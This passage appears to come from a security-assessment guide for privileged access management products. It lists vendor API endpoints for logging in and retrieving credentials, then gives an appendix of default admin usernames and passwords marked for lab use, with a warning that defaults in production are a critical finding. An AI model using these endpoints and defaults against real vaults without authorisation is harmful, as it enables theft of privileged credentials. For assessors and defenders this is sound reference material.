| BeyondTrust PRA | `/login.aspx` | 443 | `/api/oauth2/token` | `/api/v1/credentials` |
| BeyondTrust Password Safe | `/api/v1/` | 443 | (shared with PRA) | `/api/v1/managed_accounts` |
| Delinea Secret Server | `/SecretServer/` | 443 | `/SecretServer/oauth2/token` | `/api/v1/secrets/<id>` |
| One Identity Safeguard SPP | `/spp/` | 443 | `/spp/api/v3/AuthenticationUser` | `/spp/api/v3/Assets/<id>/Accounts/<id>/Password` |
| One Identity Safeguard SPS | `/sps/` | 443 | (shared with SPP) | `/sps/api/v3/Session` |
| ManageEngine PMP | `/` | 7272 | `/api/json/admin/getkey` | `/api/json/resource/<id>/getAccountPasswd` |
| WALLIX Bastion | `/wab/` | 443 | `/wab/api/v1/auth/login` | `/wab/api/v1/sessions/<id>/recording` |
| Devolutions Server | `/api/v1/` | 443 | `/api/v1/login` | `/api/v1/vaults/<id>/entries/<id>/sensitive` |
| Xton Core | `/login` | 8081 | `X-Api-Key` header | `/api/v1/credentials/<id>/reveal` |

---

## 13. Appendix B: PAM Vendor Default Credentials (for lab use only)

> WARNING: These are well-known defaults that should NEVER appear in production. Their presence in production is an immediate finding.

| Vendor | Default Username | Default Password |
|--------|-----------------|------------------|
| CyberArk (vault admin) | `Administrator` | (set at install -- common lab default `Cyberark123`) |
| CyberArk (PSM) | `PSMConnect` | (set at install) |
| CyberArk (PVWA) | `PVWAUser` | (set at install) |
| BeyondTrust PRA | `admin` | (set at install) |
| BeyondTrust Password Safe | `sysadmin` | (set at install) |
| Delinea Secret Server | `ssadmin` | (set at install) |
| ManageEngine PMP | `admin` | `admin` (must change at first logon) |
| One Identity Safeguard | `admin` | (set at install, smart-card enforced after first boot) |
| WALLIX Bastion | `admin` | (set at install) |
| Devolutions Server | (set at install) | (set at install) |
| Xton Core | `admin` | (set at install) |

Always reset default credentials during the lab build. In production, the presence of any default credential is a CRITICAL finding.
